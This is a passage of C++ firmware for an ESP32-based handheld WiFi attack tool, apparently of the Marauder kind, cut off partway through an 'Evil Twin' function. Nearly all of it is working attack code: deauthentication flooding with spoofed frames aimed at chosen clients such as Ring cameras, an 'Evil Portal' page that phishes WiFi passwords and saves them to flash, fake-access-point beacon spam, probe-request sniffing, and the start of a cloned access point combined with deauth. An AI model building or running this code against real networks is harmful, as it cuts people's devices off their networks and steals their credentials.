        uint16_t sc = ((uint16_t)(s_deauth_seq++ & 0x0FFF)) << 4;
        s_deauth_frame[22]   = (uint8_t)(sc);
        s_deauth_frame[23]   = (uint8_t)(sc >> 8);
        s_disassoc_frame[22] = (uint8_t)(sc);
        s_disassoc_frame[23] = (uint8_t)(sc >> 8);

        esp_wifi_80211_tx(WIFI_IF_AP, s_deauth_frame,   sizeof(s_deauth_frame),   false);
        esp_wifi_80211_tx(WIFI_IF_AP, s_disassoc_frame, sizeof(s_disassoc_frame), false);
    }
}

// ── OUI vendor lookup ─────────────────────────────────────────
// Maps the first 3 MAC bytes to a short manufacturer name.
// Returns nullptr when the OUI is not in the table (caller shows raw MAC).
// Focused on consumer/IoT devices common in residential/SMB assessments.
// Note: modern phones/laptops often use MAC randomization, so those may
// still show as unknown even when the real vendor is Apple/Samsung/etc.
// IoT devices (Ring, Nest, Echo, Hue, Roku) almost never randomize.
static const char* oui_vendor(const uint8_t* mac) {
    uint32_t k = ((uint32_t)mac[0] << 16) | ((uint32_t)mac[1] << 8) | mac[2];
    // Sorted within each section for readability; linear search is fine for
    // a one-time per-client lookup (≤16 clients × ~130 entries).
    static const struct { uint32_t k; const char* v; } T[] = {
        // ── Amazon / Ring / Eero ───────────────────────────────
        {0x0C47C9, "Amazon"},   {0x30862D, "Eero"},
        {0x34A395, "Ring"},     {0x40B4CD, "Amazon"},
        {0x50DCE7, "Amazon"},   {0x6854FD, "Amazon"},
        {0x702C1F, "Ring"},     {0x747548, "Amazon"},
        {0x84D6D0, "Amazon"},   {0xA40801, "Amazon"},
        {0xAC63BE, "Amazon"},   {0xB009DA, "Ring"},
        {0xB47C9C, "Amazon"},   {0xFC65DE, "Amazon"},
        {0xFCA183, "Ring"},
        // ── Google / Nest / Wyze ───────────────────────────────
        {0x18B430, "Nest"},     {0x20DFB9, "Google"},
        {0x2CAA8E, "Wyze"},     {0x3C5AB4, "Google"},
        {0x48D6D5, "Google"},   {0x546009, "Google"},
        {0x641666, "Nest"},     {0xA47733, "Google"},
        {0xF4F5D8, "Google"},
        // ── Apple ──────────────────────────────────────────────
        {0x001CB3, "Apple"},    {0x002241, "Apple"},
        {0x0023DF, "Apple"},    {0x0025BC, "Apple"},
        {0x189EFC, "Apple"},    {0x28CFDA, "Apple"},
        {0x3CD0F8, "Apple"},    {0x40A6D9, "Apple"},
        {0x5855CA, "Apple"},    {0x60D9C7, "Apple"},
        {0x685B35, "Apple"},    {0x74E1B6, "Apple"},
        {0x78CA39, "Apple"},    {0x842999, "Apple"},
        {0x8C5877, "Apple"},    {0x90840D, "Apple"},
        {0xA4C3F0, "Apple"},    {0xB817C2, "Apple"},
        {0xC42C03, "Apple"},    {0xD4619D, "Apple"},
        {0xDC2B2A, "Apple"},    {0xF0D1A9, "Apple"},
        {0xF4F15A, "Apple"},
        // ── Samsung ────────────────────────────────────────────
        {0x34AA8B, "Samsung"},  {0x38A4ED, "Samsung"},
        {0x5001BB, "Samsung"},  {0x8C7712, "Samsung"},
        {0x94350A, "Samsung"},  {0xA00798, "Samsung"},
        {0xB479A7, "Samsung"},  {0xBC20A4, "Samsung"},
        {0xCC07AB, "Samsung"},
        // ── TP-Link ────────────────────────────────────────────
        {0x14CF92, "TP-Link"},  {0x50C7BF, "TP-Link"},
        {0x54A703, "TP-Link"},  {0x6C5AB0, "TP-Link"},
        {0x8416F9, "TP-Link"},  {0xA42BB0, "TP-Link"},
        {0xB04E26, "TP-Link"},  {0xE8DE27, "TP-Link"},
        {0xEC172F, "TP-Link"},
        // ── Netgear / Arlo ────────────────────────────────────
        {0x00146C, "Netgear"},  {0x20107A, "Netgear"},
        {0x3C3786, "Arlo"},     {0x4494FC, "Arlo"},
        {0x6CB0CE, "Netgear"},  {0x841B5E, "Netgear"},
        {0xA021B7, "Netgear"},  {0xC0FFD4, "Netgear"},
        // ── Ubiquiti ───────────────────────────────────────────
        {0x24A43C, "Ubiquiti"}, {0x44D9E7, "Ubiquiti"},
        {0x687251, "Ubiquiti"}, {0x788A20, "Ubiquiti"},
        {0x802AA8, "Ubiquiti"}, {0xDC9FDB, "Ubiquiti"},
        {0xF09FC2, "Ubiquiti"},
        // ── Raspberry Pi ───────────────────────────────────────
        {0xB827EB, "RPi"},      {0xDCA632, "RPi"},
        {0xE45F01, "RPi"},
        // ── Roku ───────────────────────────────────────────────
        {0x000D4B, "Roku"},     {0xB83E59, "Roku"},
        {0xCC6DA0, "Roku"},     {0xDC3A5E, "Roku"},
        // ── Sony ───────────────────────────────────────────────
        {0x0013A9, "Sony"},     {0x3017C8, "Sony"},
        {0xAC9B0A, "Sony"},     {0xF0BF97, "Sony"},
        // ── Nintendo ───────────────────────────────────────────
        {0x0009BF, "Nintendo"}, {0x0017AB, "Nintendo"},
        {0x001F32, "Nintendo"}, {0x7CBB8A, "Nintendo"},
        {0x98B6E9, "Nintendo"},
        // ── Philips Hue ────────────────────────────────────────
        {0x001788, "Hue"},
        // ── ASUS ───────────────────────────────────────────────
        {0x04D9F5, "ASUS"},     {0x10BF48, "ASUS"},
        {0x14DAE9, "ASUS"},     {0x74D02B, "ASUS"},
        {0xAC9E17, "ASUS"},     {0xE03F49, "ASUS"},
        // ── Intel (common laptop WiFi adapters) ───────────────
        {0x001B21, "Intel"},    {0x5C5F67, "Intel"},
        {0x88532E, "Intel"},
        // ── Dell ───────────────────────────────────────────────
        {0x001422, "Dell"},     {0x141877, "Dell"},
        {0xF01FAF, "Dell"},
        // ── HP ─────────────────────────────────────────────────
        {0x3CD92B, "HP"},       {0x5820B1, "HP"},
        // ── Microsoft ──────────────────────────────────────────
        {0x0050F2, "Microsoft"},{0x281878, "Microsoft"},
        // ── Linksys / Belkin ───────────────────────────────────
        {0x001491, "Belkin"},   {0x149182, "Belkin"},
        {0x00173F, "Linksys"},
    };
    // clang-format on
    for (size_t i = 0; i < sizeof(T)/sizeof(T[0]); i++)
        if (T[i].k == k) return T[i].v;
    return nullptr;
}

// ── Directed deauth (unicast) ─────────────────────────────────
// Sends frames in BOTH directions so both ends tear down the association:
//   AP→client  (DA=client, SA=BSSID, BSSID=BSSID)
//   client→AP  (DA=BSSID,  SA=client, BSSID=BSSID) — spoofed
// More reliable than broadcast for devices that filter bcast mgmt frames
// (Ring cameras, some IoT/enterprise firmware).
static void _send_deauth_directed(const uint8_t* bssid, const uint8_t* client) {
    uint8_t to_cli[26], to_ap[26];
    memcpy(to_cli, s_deauth_frame, 26);   // copy FC, duration, reason word
    memcpy(to_ap,  s_deauth_frame, 26);
    // AP→client: DA=client, SA=BSSID, BSSID=BSSID
    memcpy(to_cli + 4,  client, 6);
    memcpy(to_cli + 10, bssid,  6);
    memcpy(to_cli + 16, bssid,  6);
    // Spoofed client→AP: DA=BSSID, SA=client, BSSID=BSSID
    memcpy(to_ap + 4,  bssid,  6);
    memcpy(to_ap + 10, client, 6);
    memcpy(to_ap + 16, bssid,  6);
    for (int i = 0; i < 50; i++) {
        uint16_t sc = ((uint16_t)(s_deauth_seq++ & 0x0FFF)) << 4;
        to_cli[22] = to_ap[22] = (uint8_t)(sc);
        to_cli[23] = to_ap[23] = (uint8_t)(sc >> 8);
        esp_wifi_80211_tx(WIFI_IF_AP, to_cli, 26, false);
        esp_wifi_80211_tx(WIFI_IF_AP, to_ap,  26, false);
    }
}

// ── Client discovery (promiscuous sniff) ─────────────────────
// 5-second passive sniff on the target channel.  Data and management
// frames are inspected for ToDS/FromDS bits; addr1/addr2 are checked
// against the target BSSID to extract associated client MACs.
#define MAX_SNIFF_CLIENTS 16
static uint8_t s_sniff_bssid[6];
static uint8_t s_found_clients[MAX_SNIFF_CLIENTS][6];
static int8_t  s_found_rssi[MAX_SNIFF_CLIENTS];
static int     s_found_count = 0;

static void IRAM_ATTR _client_sniff_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (s_found_count >= MAX_SNIFF_CLIENTS) return;
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    if (pkt->rx_ctrl.sig_len < 26) return;
    const uint8_t* d = pkt->payload;
    // ToDS/FromDS: FC byte 1, bits 0 and 1
    bool to_ds   = (d[1] >> 0) & 1;
    bool from_ds = (d[1] >> 1) & 1;
    const uint8_t* bssid_p  = nullptr;
    const uint8_t* client_p = nullptr;
    if      (to_ds && !from_ds)  { bssid_p = d+4;  client_p = d+10; }  // client→AP
    else if (!to_ds && from_ds)  { client_p = d+4;  bssid_p  = d+10; } // AP→client
    else                          { return; }                             // IBSS/WDS
    if (memcmp(bssid_p, s_sniff_bssid, 6) != 0) return;
    if (client_p[0] & 0x01) return;   // skip multicast/broadcast MACs
    for (int i = 0; i < s_found_count; i++)
        if (memcmp(s_found_clients[i], client_p, 6) == 0) return;
    memcpy(s_found_clients[s_found_count], client_p, 6);
    s_found_rssi[s_found_count] = pkt->rx_ctrl.rssi;
    s_found_count++;
}

void wifi_deauth_run() {
    if (s_net_count == 0) {
        show_message("Deauth", "Run Scan first to\npopulate targets.");
        delay(1800);
        return;
    }

    // Select target — 2.4 GHz only (ESP32 radio cannot transmit on 5 GHz).
    // tgt_idx[] maps menu position → s_nets[] index so filtering doesn't
    // corrupt the lookup when 5 GHz entries are skipped.
    static char tgt_labels[WIFI_MAX_NETS][38];
    static int  tgt_idx[WIFI_MAX_NETS];
    int tgt_count = 0;
    Menu tm("Target (2.4GHz)", "A:scroll", "B:select");
    for (int i = 0; i < s_net_count; i++) {
        if (s_nets[i].channel > 14) continue;  // skip 5 GHz APs
        tgt_idx[tgt_count] = i;
        snprintf(tgt_labels[tgt_count], sizeof(tgt_labels[0]),
                 "%-20.20s Ch%d", s_nets[i].ssid, s_nets[i].channel);
        tm.add(tgt_labels[tgt_count], "");
        tgt_count++;
    }
    if (tgt_count == 0) {
        show_message("Deauth", "No 2.4 GHz networks\nfound. Re-scan.");
        delay(2000);
        return;
    }
    tm.add("< Back", "");
    tm.draw();

    int target = -1;
    while (target < 0) {
        M5.update();
        if (M5.BtnA.wasPressed()) tm.scroll_down();
        if (M5.BtnB.wasPressed()) {
            int sel = tm.selected();
            if (sel == tgt_count) return;       // Back
            target = tgt_idx[sel];              // map menu pos → s_nets index
        }
        if (M5.BtnB.pressedFor(LONG_PRESS_MS)) return;
        delay(10);
    }

    // WPA3 and WPA2/WPA3-transitional APs require PMF (802.11w).
    // Unprotected deauth/disassoc frames are silently discarded by PMF clients,
    // so the attack will not work against them — warn the user.
    {
        uint8_t amode = s_nets[target].authmode;
        bool pmf_required = (amode == WIFI_AUTH_WPA3_PSK ||
                             amode == WIFI_AUTH_WPA2_WPA3_PSK);
        if (pmf_required) {
            display_clear();
            draw_header("PMF Warning");
            M5.Lcd.setTextSize(1);
            M5.Lcd.setTextColor(CLR_ERR, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 2);
            M5.Lcd.print("Target uses WPA3/PMF\n(802.11w required).\nUnprotected deauth\nframes are IGNORED\nby clients.\n\nA:try anyway  B:back");
            draw_footer("A:try", "B:back");
            bool pmf_wait = true, proceed = false;
            while (pmf_wait) {
                M5.update();
                if (M5.BtnA.wasPressed()) { proceed = true;  pmf_wait = false; }
                if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) { pmf_wait = false; }
                delay(10);
            }
            if (!proceed) return;
        }
    }

    // ── Client discovery: 5-second promiscuous sniff ──────────────
    // Switch to STA mode (required for promiscuous), sniff for client MACs
    // associated with the target BSSID, then clean up before AP mode setup.
    s_found_count = 0;
    memcpy(s_sniff_bssid, s_nets[target].bssid, 6);

    display_clear();
    draw_header("Client Scan");
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 2);
    M5.Lcd.printf("Scanning Ch%d for\nclients (5s)...", s_nets[target].channel);
    M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 28);
    M5.Lcd.print("B: skip scan");

    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    delay(100);
    {
        wifi_promiscuous_filter_t pf = {};
        pf.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT;
        esp_wifi_set_promiscuous_filter(&pf);
    }
    esp_wifi_set_promiscuous_rx_cb(_client_sniff_cb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(s_nets[target].channel, WIFI_SECOND_CHAN_NONE);

    {
        uint32_t sniff_start = millis();
        while (millis() - sniff_start < 5000) {
            M5.update();
            if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) break;
            uint32_t elapsed = millis() - sniff_start;
            int bar_w = (int)((uint32_t)(DISP_W - 8) * min(elapsed, (uint32_t)5000) / 5000);
            M5.Lcd.fillRect(4,           CONTENT_Y + 50, bar_w,                   7, CLR_PRIMARY);
            M5.Lcd.fillRect(4 + bar_w,   CONTENT_Y + 50, (DISP_W - 8) - bar_w,   7, CLR_BG);
            M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 62);
            M5.Lcd.printf("Found: %d client%s   ", s_found_count,
                          s_found_count == 1 ? "" : "s");
            delay(100);
        }
    }
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.mode(WIFI_OFF);
    delay(50);

    // ── Client picker ──────────────────────────────────────────────
    // Menu: [All clients (bcast)] + [each found MAC] + [< Back]
    // 30 chars: up to 9-char vendor name + space + full 17-char MAC + NUL
    static char cli_lbl[MAX_SNIFF_CLIENTS + 2][30];
    Menu cm("Select Target", "A:scroll", "B:select");
    int cli_count = 0;
    snprintf(cli_lbl[cli_count], sizeof(cli_lbl[0]), "All clients (bcast)");
    cm.add(cli_lbl[cli_count++], "");
    for (int i = 0; i < s_found_count; i++) {
        const uint8_t* cm_mac = s_found_clients[i];
        const char* vendor = oui_vendor(cm_mac);
        if (vendor) {
            // "%-9.9s %02X:%02X:%02X:%02X:%02X:%02X"  → max 9+1+17 = 27 chars
            snprintf(cli_lbl[cli_count], sizeof(cli_lbl[0]),
                     "%-9.9s %02X:%02X:%02X:%02X:%02X:%02X",
                     vendor,
                     cm_mac[0], cm_mac[1], cm_mac[2],
                     cm_mac[3], cm_mac[4], cm_mac[5]);
        } else {
            snprintf(cli_lbl[cli_count], sizeof(cli_lbl[0]),
                     "%02X:%02X:%02X:%02X:%02X:%02X",
                     cm_mac[0], cm_mac[1], cm_mac[2],
                     cm_mac[3], cm_mac[4], cm_mac[5]);
        }
        cm.add(cli_lbl[cli_count++], "");
    }
    cm.add("< Back", "");
    cm.draw();

    bool     use_bcast  = true;
    uint8_t  tgt_client[6] = {};
    int      cli_choice = -1;
    while (cli_choice < 0) {
        M5.update();
        if (M5.BtnA.wasPressed()) cm.scroll_down();
        if (M5.BtnB.wasPressed()) {
            int sel = cm.selected();
            if (sel == cli_count) return;           // Back
            if (sel == 0) {
                use_bcast = true;
            } else {
                use_bcast = false;
                memcpy(tgt_client, s_found_clients[sel - 1], 6);
            }
            cli_choice = sel;
        }
        if (M5.BtnB.pressedFor(LONG_PRESS_MS)) return;
        delay(10);
    }

    // Use AP interface for reliable raw frame injection.
    // esp_wifi_80211_tx(WIFI_IF_STA) silently drops frames when unassociated
    // (known IDF behaviour on ESP32-S3).  WIFI_IF_AP is always fully active
    // once softAP starts — known-working in ESP32 Marauder and similar tools.
    WiFi.persistent(false);
    WiFi.mode(WIFI_AP);
    // Hidden AP on the target channel — minimises interference;
    // softAP also puts the radio on the correct channel before first TX.
    // Use "" (not nullptr) for password — Arduino WiFi lib may not handle
    // null pointer correctly on ESP32-S3 and can produce a silent open AP
    // on the wrong channel.
    WiFi.softAP("x", "", s_nets[target].channel, /*hidden=*/1);
    delay(300);  // 300 ms: give the AP stack and radio time to fully settle
                 // on the target channel before we start injecting frames.
                 // 100 ms was too short — early frames were landing on the
                 // driver-default channel (1) instead of the target channel.
    // Push TX power to hardware maximum: 82 × 0.25 dBm = 20.5 dBm
    esp_wifi_set_max_tx_power(82);
    // Note: esp_wifi_set_protocol() is intentionally NOT called here.
    // 802.11 management frames (deauth/disassoc) are always transmitted at
    // legacy basic rates by the standard — protocol mode only affects data
    // frames.  Calling set_protocol triggers a radio re-init that stomps the
    // channel back to driver default regardless of call order.
    esp_wifi_set_channel(s_nets[target].channel, WIFI_SECOND_CHAN_NONE);
    delay(100);  // let the explicit channel switch take effect before TX

    display_clear();
    draw_header("Deauth Active");
    char mac[18]; bssid_str(s_nets[target].bssid, mac);
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 2);
    M5.Lcd.printf("Target: %.18s", s_nets[target].ssid);
    M5.Lcd.setCursor(4, CONTENT_Y + 14);
    M5.Lcd.printf("BSSID:  %s", mac);
    M5.Lcd.setCursor(4, CONTENT_Y + 26);
    M5.Lcd.printf("Ch: %d  [%s]", s_nets[target].channel,
                  auth_str(s_nets[target].authmode));
    M5.Lcd.setCursor(4, CONTENT_Y + 38);
    if (use_bcast) {
        M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
        M5.Lcd.print("Client: ALL (bcast)");
    } else {
        M5.Lcd.setTextColor(CLR_ACCENT, CLR_BG);
        {
            const char* vn = oui_vendor(tgt_client);
            if (vn)
                M5.Lcd.printf("%s %02X:%02X:%02X:%02X:%02X:%02X",
                              vn,
                              tgt_client[0], tgt_client[1], tgt_client[2],
                              tgt_client[3], tgt_client[4], tgt_client[5]);
            else
                M5.Lcd.printf("%02X:%02X:%02X:%02X:%02X:%02X",
                              tgt_client[0], tgt_client[1], tgt_client[2],
                              tgt_client[3], tgt_client[4], tgt_client[5]);
        }
    }
    M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
    draw_footer("", "B:stop");

    uint32_t total_frames = 0;
    uint32_t t_rate_ms    = millis();
    uint32_t frames_at_t  = 0;
    uint32_t fps          = 0;
    uint32_t t_disp       = 0;

    while (true) {
        M5.update();
        // Directed deauth sends frames to a specific client (both directions);
        // broadcast sends to FF:FF:FF:FF:FF:FF so all associated clients hear it.
        if (use_bcast) {
            _send_deauth(s_nets[target].bssid);           // 50 deauth + 50 disassoc
        } else {
            _send_deauth_directed(s_nets[target].bssid, tgt_client);  // 50 + 50
        }
        total_frames += 100;
        // Pace bursts — without delay the IDF inject queue overflows and most
        // frames are silently discarded before they ever reach the radio.
        delay(10);

        // Compute frame rate every second
        uint32_t now = millis();
        if (now - t_rate_ms >= 1000) {
            fps         = total_frames - frames_at_t;
            frames_at_t = total_frames;
            t_rate_ms   = now;
        }

        // Throttle display updates to ~5 Hz — LCD SPI is slow
        if (now - t_disp >= 200) {
            t_disp = now;
            M5.Lcd.setTextColor(CLR_PRIMARY, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 54);
            M5.Lcd.printf("Frames: %-8lu  %lu/s   ", total_frames, fps);
        }

        if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) break;
        // No delay() — blast frames at maximum rate
    }

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
}

// ─── Evil Portal ──────────────────────────────────────────────
static const char PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset='utf-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Network Login</title>
<style>
body{font-family:sans-serif;background:#111;color:#eee;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.box{background:#1a0000;border:1px solid #c00;border-radius:8px;padding:30px;max-width:340px;width:90%}
h2{color:#ff2020;margin-top:0}input{width:100%;padding:8px;margin:6px 0 14px;box-sizing:border-box;background:#2a0000;border:1px solid #c00;color:#eee;border-radius:4px}
button{background:#c00;color:#fff;border:none;padding:10px 24px;border-radius:4px;cursor:pointer;font-size:1em}
</style></head>
<body><div class='box'>
<h2>&#128246; WiFi Login</h2>
<p>Enter your WiFi password to continue.</p>
<form action='/capture' method='POST'>
<label>Network Password</label>
<input type='password' name='pass' placeholder='Password' required>
<button type='submit'>Connect</button>
</form></div></body></html>
)rawliteral";

static const char PORTAL_OK_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset='utf-8'>
<title>Connecting...</title></head>
<body style='font-family:sans-serif;background:#111;color:#eee;text-align:center;padding-top:80px'>
<h2 style='color:#0f0'>Connecting...</h2>
<p>Please wait while we connect your device.</p>
</body></html>
)rawliteral";

static String s_captured_pass = "";

void wifi_evil_portal_run() {
    const char* ap_ssid = "Free WiFi";  // Customize as desired
    s_captured_pass = "";

    WiFi.softAP(ap_ssid);
    delay(500);

    if (s_server) { delete s_server; s_server = nullptr; }
    s_server = new AsyncWebServer(80);

    // Captive portal redirect
    s_server->on("/generate_204",   HTTP_GET, [](AsyncWebServerRequest* r){ r->redirect("http://192.168.4.1/"); });
    s_server->on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest* r){ r->redirect("http://192.168.4.1/"); });

    // Main portal page
    s_server->on("/", HTTP_GET, [](AsyncWebServerRequest* r){
        r->send(200, "text/html", PORTAL_HTML);
    });

    // Capture credentials
    s_server->on("/capture", HTTP_POST, [](AsyncWebServerRequest* r){
        if (r->hasParam("pass", true)) {
            s_captured_pass = r->getParam("pass", true)->value();
        }
        r->send(200, "text/html", PORTAL_OK_HTML);
    });

    // DNS redirect — catch all
    s_server->onNotFound([](AsyncWebServerRequest* r){
        r->redirect("http://192.168.4.1/");
    });

    s_server->begin();

    display_clear();
    draw_header("Evil Portal");
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 2);
    M5.Lcd.printf("SSID: %s\nIP:   192.168.4.1", ap_ssid);
    draw_footer("", "B:stop");

    while (true) {
        M5.update();
        // Show captured password if received
        if (s_captured_pass.length() > 0) {
            M5.Lcd.fillRect(0, CONTENT_Y + 30, DISP_W, 30, CLR_BG);
            M5.Lcd.setTextColor(CLR_SUCCESS, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 32);
            M5.Lcd.print("CAPTURED:");
            M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 44);
            M5.Lcd.print(s_captured_pass.substring(0, 30));
            // Save to file
            File f = SPIFFS.open("/captures/portal.txt", "a");
            if (f) { f.println(s_captured_pass); f.close(); }
            s_captured_pass = "";
        }
        if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) break;
        delay(100);
    }

    s_server->end();
    delete s_server; s_server = nullptr;
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
}

// ─── Beacon Spam ──────────────────────────────────────────────
static const char* SPAM_SSIDS[] = {
    "FBI Surveillance Van",
    "Pretty Fly for a WiFi",
    "Bill Wi the Science Fi",
    "The LAN Before Time",
    "Silence of the LANs",
    "Not Your WiFi",
    "Tell My WiFi Love Her",
    "Abraham Linksys",
    "Martin Router King",
    "Wu-Tang LAN",
    "Nacho WiFi",
    "The Promised LAN",
    "Router? I Hardly Know Her",
    "Loading...",
    "PINGEQUA_RF_001",
};
#define SPAM_SSID_COUNT  15

static uint8_t s_beacon[128];

static int _build_beacon(const char* ssid, uint8_t channel, uint8_t* pkt) {
    memset(pkt, 0, 128);
    // Frame control
    pkt[0]=0x80; pkt[1]=0x00;  // Beacon
    pkt[2]=0x00; pkt[3]=0x00;  // Duration
    // DA: Broadcast
    memset(&pkt[4], 0xFF, 6);
    // SA + BSSID: random
    for(int i=0;i<6;i++) pkt[10+i] = random(0,256);
    pkt[10] &= 0xFE; // unicast
    memcpy(&pkt[16], &pkt[10], 6);
    pkt[22]=0x00; pkt[23]=0x00; // Seq
    // Fixed params: timestamp(8), interval(2), cap(2)
    memset(&pkt[24], 0, 8); // timestamp
    pkt[32]=0x64; pkt[33]=0x00; // 100 TU interval
    pkt[34]=0x31; pkt[35]=0x04; // cap: ESS+short preamble+short slot
    // SSID element
    uint8_t ssid_len = min((int)strlen(ssid), 32);
    pkt[36]=0x00; pkt[37]=ssid_len;
    memcpy(&pkt[38], ssid, ssid_len);
    // Supported rates
    int off=38+ssid_len;
    pkt[off++]=0x01; pkt[off++]=0x08;
    pkt[off++]=0x82; pkt[off++]=0x84; pkt[off++]=0x8B; pkt[off++]=0x96;
    pkt[off++]=0x24; pkt[off++]=0x30; pkt[off++]=0x48; pkt[off++]=0x6C;
    // DS param (channel)
    pkt[off++]=0x03; pkt[off++]=0x01; pkt[off++]=channel;
    return off;
}

void wifi_beacon_spam_run() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);

    display_clear();
    draw_header("Beacon Spam");
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 2);
    M5.Lcd.print("Broadcasting fake APs...");
    draw_footer("", "B:stop");

    uint32_t idx = 0;
    while (true) {
        M5.update();
        const char* ssid = SPAM_SSIDS[idx % SPAM_SSID_COUNT];
        uint8_t ch = (idx % 11) + 1;
        int len = _build_beacon(ssid, ch, s_beacon);
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_STA, s_beacon, len, false);

        M5.Lcd.setTextColor(CLR_PRIMARY, CLR_BG);
        M5.Lcd.setCursor(4, CONTENT_Y + 20);
        M5.Lcd.printf("SSID: %-24.24s", ssid);
        M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
        M5.Lcd.setCursor(4, CONTENT_Y + 32);
        M5.Lcd.printf("Count: %lu   Ch: %d  ", idx+1, ch);

        idx++;
        if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) break;
        delay(30);
    }

    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
}

// ─── Probe Sniffer ────────────────────────────────────────────
static uint32_t s_probe_count = 0;
static char     s_last_probe[33] = {0};

static void IRAM_ATTR _probe_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = p->payload;
    // Probe request: FC=0x40
    if (payload[0] != 0x40) return;
    s_probe_count++;
    // Extract SSID from probe request
    int ssid_len = payload[25];
    if (ssid_len > 0 && ssid_len <= 32) {
        memcpy(s_last_probe, &payload[26], ssid_len);
        s_last_probe[ssid_len] = 0;
    }
}

void wifi_probe_sniff_run() {
    s_probe_count = 0;
    memset(s_last_probe, 0, sizeof(s_last_probe));

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    wifi_promiscuous_filter_t f = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&f);
    esp_wifi_set_promiscuous_rx_cb(&_probe_cb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

    display_clear();
    draw_header("Probe Sniff");
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 2);
    M5.Lcd.print("Listening for probe requests...");
    draw_footer("A:ch++", "B:stop");

    uint8_t ch = 1;
    uint32_t last_draw = 0;

    while (true) {
        M5.update();
        if (M5.BtnA.wasPressed()) {
            ch = (ch % 13) + 1;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        }
        uint32_t now = millis();
        if (now - last_draw > 300) {
            M5.Lcd.fillRect(0, CONTENT_Y + 16, DISP_W, 50, CLR_BG);
            M5.Lcd.setTextColor(CLR_PRIMARY, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 18);
            M5.Lcd.printf("Count: %lu  Ch: %d", s_probe_count, ch);
            M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 32);
            M5.Lcd.printf("Last: %.30s", s_last_probe);
            last_draw = now;
        }
        if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) break;
        delay(20);
    }

    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
}

// ─── Evil Twin ────────────────────────────────────────────────
// Clones a target AP (same SSID, same channel, open / no password)
// while deauthing clients away from the real AP.  Clients whose
// devices roam to our clone are shown a captive portal that captures
// their WiFi password.
//
// Requires a prior scan (s_net_count > 0).
// Reuses PORTAL_HTML / PORTAL_OK_HTML and s_captured_pass from
// the Evil Portal module — they are file-scope and shared.
void wifi_evil_twin_run() {
    if (s_net_count == 0) {
        show_message("Evil Twin", "Run Scan first\nto populate targets.");
        delay(1800);
        return;
    }

    // ── Target picker — 2.4 GHz only ──────────────────────────
    static char et_lbl[WIFI_MAX_NETS][40];
    static int  et_idx[WIFI_MAX_NETS];
    int et_count = 0;
    Menu tm("EvilTwin (2.4GHz)");
    for (int i = 0; i < s_net_count; i++) {
        if (s_nets[i].channel > 14) continue;  // ESP32 is 2.4 GHz only
        et_idx[et_count] = i;
        snprintf(et_lbl[et_count], sizeof(et_lbl[0]),
                 "%-20.20s Ch%d", s_nets[i].ssid, s_nets[i].channel);
        tm.add(et_lbl[et_count], "");
        et_count++;
    }
    if (et_count == 0) {
        show_message("Evil Twin", "No 2.4 GHz networks\nfound. Re-scan.");
        delay(2000);
        return;
    }
